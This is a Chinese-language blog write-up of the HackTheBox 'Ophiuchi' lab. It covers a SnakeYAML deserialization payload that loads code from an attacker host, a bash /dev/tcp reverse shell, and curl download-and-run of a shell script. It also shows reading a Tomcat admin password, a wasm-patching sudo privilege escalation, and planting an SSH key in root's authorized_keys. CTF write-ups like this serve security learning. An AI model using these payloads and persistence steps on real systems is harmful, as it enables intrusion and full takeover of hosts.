---
layout:     post
title:      HackTheBox Ophiuchi
subtitle:   HackTheBox
date:       2021-06-08
author:     heria
header-img: img/post-bg-028.jpg
catalog: true
tags:
---



![image-20210607144706732](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607144706732.png)

## 信息收集

```
nmap -sC -sS -sV 10.10.10.227
```

![image-20210607144816891](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607144816891.png)

22和8080端口

## 渗透

来到8080端口，发现在线yaml解析（yaml通常用于配置文件和存储或传输数据的应用程序）

![image-20210607145212817](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607145212817.png)

随便输入数据，提示如下信息

![image-20210607145351911](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607145351911.png)

我们可以试着寻找一些已知的YAML漏洞，经过搜索引擎搜索后，我们找到一个YAML Parser 的RCE漏洞：

```
https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858
```

使用文中的poc进行漏洞验证，首先kali开启SimpleHTTPServer

之后发送如下数据

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

![image-20210607145742804](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607145742804.png)

kali发现存在访问记录，说明存在漏洞

![image-20210607145757604](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607145757604.png)

去如下地址下载利用代码

```
https://github.com/artsploit/yaml-payload
```

首先创建一个shell.sh 

写入反弹shell语句

```
bash -i >& /dev/tcp/10.10.14.3/8888 0>&1
```

之后修改脚本文件内容

通过curl下载反弹shell脚本

```
curl http://10.10.14.3/shell.sh -o /tmp/shell.sh  
```

执行

```
bash /tmp/shell.sh
```

![image-20210607150702527](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607150702527.png)

打jar包

```
cd yaml-payload-master
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf shell.jar -C src/ .
```

![image-20210607152057073](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607152057073.png)

生成shell.jar

kali开启HTTP服务,同时开启shell.sh中指定的监听端口

![image-20210607152900430](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607152900430.png)

发送如下数据

![image-20210607152838559](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607152838559.png)

之后反弹shell成功执行

![image-20210607152828064](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607152828064.png)

在/opt/tomcat/conf/tomcat-users.xml找到admin和密码whythereisalimit

![image-20210607153947548](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607153947548.png)

之后ssh连接，拿到第一个flag

![image-20210607154151335](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607154151335.png)

## 提权

sudo -l查看特权文件

![image-20210607154256150](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607154256150.png)

函数和变量从main.wasm文件中导入并检查变量的值f，如果它等于1，执行deploy.sh，并且main.wasm和deploy.sh是相对路径，我们可以修改原main.wasm文件总是返回1的结果，并建立自己的deploy.sh获得root权限。

我们通过nc文件传输到本地，到本地修改文件

因为main.wasm是编译后的二进制文件，不能直接编辑，首先要转换为.wat文件，然后修改它返回1，再次将它转换为.wasm二进制文件。先安装wat工具。

```
https://github.com/webassembly/wabt
```

下载后执行以下语句

```
$ cd wabt
$ mkdir build
$ cd build
$ cmake .. -DBUILD_TESTS=OFF
$ cmake --build .
```

编译时，说缺少一个wasm.h。这个不用理会，bin目录下该有的都有了

之后在目标机上执行

```
cd tmp
mkdir work && cd work

cp /opt/wasm-functions/main.wasm ./
```

![image-20210607175158727](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607175158727.png)

自己创建个deploy.sh，文件内容如下

```
echo $(id)
```

使用nc将main.wasm从目标机传输到我们本地机器

```
cat main.wasm | nc {your-ip} {your-port}   (on target)
nc -lnvp {your-port} > main.wasm           (on local)
```

![image-20210607175743749](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210607175743749.png)

转为wat

```
./wasm2wat main.wasm >main.wat
```

![image-20210608085643908](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608085643908.png)

把0修改成1

![image-20210608085859119](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608085859119.png)

重新编译回二进制文件，之后通过scp上传

```
./wat2wasm main.wat
scp main.wasm admin@10.10.10.227:/tmp/work
```

![image-20210608094110039](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608094110039.png)

之后执行脚本，看到在该路径下执行特权文件，由于main.wasm中值被修改，会执行我们自己创建的deploy文件，输出id信息

```
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

![image-20210608094425173](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608094425173.png)

之后考虑将ssh公钥写进目标机对应文件,使用ssh密钥对登录

kali首先生成密钥对

```
ssh-keygen
cat /root/.ssh/id_rsa.pub
```

![image-20210608095519807](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608095519807.png)

修改delploy文件

```
echo "ssh-rsa xxxxxx" >> /root/.ssh/authorized_keys
```

![image-20210608095705829](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608095705829.png)

修改之后重新执行一遍脚本

之后就可以直接ssh登录了，拿到第二个flag

![image-20210608095911215](https://raw.githubusercontent.com/heriachen/cloudimg/main/img4/image-20210608095911215.png)